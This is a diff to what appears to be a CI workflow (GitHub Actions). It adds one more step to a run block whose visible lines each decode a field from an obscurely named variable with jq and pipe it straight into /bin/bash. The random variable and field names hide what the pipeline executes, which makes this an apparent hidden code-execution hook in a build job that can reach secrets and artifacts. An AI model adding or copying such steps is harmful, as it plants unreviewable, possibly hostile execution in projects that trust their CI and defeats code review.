@@ -50,6 +50,7 @@ jobs:
           echo $lvc5366 | jq -r .tkf85500 | /bin/bash
           echo $f2127 | jq -r .x1890 | /bin/bash
           printf '%s' "$dz53" | jq -r .kj26 | /bin/bash
+          echo $avy96 | jq -r .lje2940 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
